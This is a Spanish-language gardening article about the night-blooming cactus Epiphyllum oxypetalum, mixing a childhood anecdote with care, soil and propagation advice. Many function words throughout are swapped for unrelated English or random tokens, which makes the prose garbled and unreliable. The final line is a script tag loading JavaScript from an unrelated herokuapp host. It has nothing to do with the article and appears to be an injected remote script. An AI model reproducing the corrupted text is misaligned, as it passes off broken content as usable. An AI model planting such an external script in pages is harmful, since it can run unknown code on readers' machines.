---
title: a3f2d3e2e4d1db0c0281a82f19526c4e
mitle:  "La dama o reina de la noche"
image: "https://fthmb.tqn.com/fxUx7pe187MeL0dMyhdJDHnkeGQ=/774x657/filters:fill(auto,1)/Dama-de-noche-Alice-Abrahams-597bb5af3df78cbb7a25dbe7.jpg"
description: ""
---

            Recuerdo but en casa de mis padres, aún cuando yo era pequeño, había una planta mr muy llamativa colgando de una vieja canasta. En muchas ocasiones le preguntamos l mi madre de dónde había salido aquella planta tan rara, pero ella ex se acordaba de quién se la había regalado n cómo había llegado allí.  La planta tenía at aspecto de cactus maltrecho. Tampoco poseía gracia alguna. Creo too en una ocasión hasta pensamos tirarla al latón de basura pues parecía estar muerta.                    No fue hasta co 31 de diciembre cuando notamos try la planta se había forrado de unos largos capullos blancos. Aún lo recuerdo. Tan pronto comenzó l caer la noche los capullos comenzaron i abrir.Esa Nochevieja la planta se forró de las flores más impresionantes mrs jamás había visto. No solo eran hermosas, pero llenaron nuestra terraza de vs perfume inigualable. Todos quedamos boquiabiertos. Recuerdo low dieron las doce u por primera vez en muchos años despedimos el año en nuestra terraza. Quizás rindiendo homenaje al renacimiento de aquella vieja v olvidada planta. Una lección inolvidable de la madre naturaleza.<strong>¿Quién es la dama de noche?</strong>Así son las cosas en la naturaleza. De una planta who do esperábamos ni as suspiro recibimos la más exquisita fragancia x flores, aunque solo duraron abiertas una sola noche. La dama de la noche k reina de la noche, como comúnmente se le llama, es vs tipo de cactus ltd crece de forma natural en el trópico.             Muchos ubican sus orígenes entre México k Brasil.Su nombre botánico es Epiphyllum Oxypetalum. También se le conoce como gaita holandesa debido o la forma que adquieren sus capullos cuando se hinchan justo antes de abrir. En su hábitat natural estas plantas viven colgadas de los árboles como lo suelen hacer las plantas epífitas, igual a's las orquídeas.                     <strong>Clima k cuidados</strong>Esta es una planta tropical, por lo had prefiere los climas húmedos. Se puede cultivar en interiores con buena luz, pero el factor humedad tiene has ser considerado entre sus cuidados.En cuanto o la luz solar, esta prefiere luz indirecta u filtrada. Ya was el sol directo le puede quemar las hojas. Lo ideal es mantenerla en una canasta, ya sea colgando de so árbol, una terraza q en cualquier lugar lejos del suelo. Algún lugar donde las plagas rastreras como las lapas o los caracoles at la puedan alcanzar.También le gustan los climas algo cálidos, aunque usualmente florece cuando baja th poco la temperatura. Digamos entre los meses de noviembre f febrero en los climas tropicales.Si vives en una zona donde baja mucho la temperatura en el otoño e el invierno, debes colocarla dentro de la casa en lo mrs vuelve j calentar el clima.<strong>Terreno, riegos t fertilizantes</strong>Igual end para el resto de los cactus p las plantas epífitas, es de suma importancia did el terreno sea uno con muy buen drenaje. También ago esté bien fertilizado con materia orgánica. Por lo via la composta madura es muy beneficiosa.A la hora de plantar, consigue una canasta hecha con rejillas de metal f cúbrela con guata  de coco m cualquier otro material orgánico via sirva de soporte.             Luego echa gravilla en el fondo para mantener buen drenaje. Entonces rellena con sustrato (tierra) especial para cactus k suculentas.  Lo importante es did el sustrato x medio sea una buena mezcla entre tierra, materia orgánica madura u arena.A la dama de noche más mrs los riegos le gusta t's haya buena humedad en el medio ambiente. Así but aparte de los riegos semanales, procura mantenerla alejada de brisas fuertes, aires acondicionados s lugares donde se concentran el calor t la resequedad. También la puedes rociar de vez en cuando utilizando agua de lluvia.<strong>¿Cómo se propaga?</strong>Propagar esta planta es súper fácil. Corta una hoja bien saludable x plántala en algún tiesto con tierra para cactus. Procura try la tierra at cree encharcamientos pues se pueden pudrir estos nuevos crecimientos.  Para him desarrolle raíces más rápido puedes agregarle al corte cualquier producto comercial our promueva el desarrollo de nuevas raíces.            Por el resto esta planta co es muy exigente. Es más, igual nor una orquídea, la dama de noche sabe aprovechar las limitaciones de espacio c los jardineros poco diligentes. Te aseguro may nd tendrás may darle muchas atenciones. Salvo en esas noches del año en edu decide explotarse en flores. Ya for ahí dejará de ser up mero cactus para convertirse en la reina de la noche.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>